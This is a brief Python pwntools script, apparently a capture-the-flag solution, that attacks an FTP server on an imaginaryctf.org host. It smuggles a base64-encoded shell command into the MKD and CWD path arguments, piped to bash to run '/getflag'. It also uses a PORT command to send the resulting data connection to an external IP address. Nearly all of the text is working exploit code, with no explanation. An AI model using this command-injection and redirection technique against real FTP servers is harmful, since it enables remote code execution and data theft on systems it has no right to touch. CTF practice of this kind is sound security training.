from pwn import *

#conn = remote("localhost", 1337)
conn = remote('nsftpd-e7458576c4110b20.d.imaginaryctf.org', 8443, ssl=True)

# listen on an external server
conn.sendline(b"PORT 192,9,137,137,164,58")
conn.sendline(b"MKD |echo L2dldGZsYWc=|base64 -d|bash")
conn.sendline(b"CWD |echo L2dldGZsYWc=|base64 -d|bash")
conn.sendline(b"LIST")

conn.interactive()
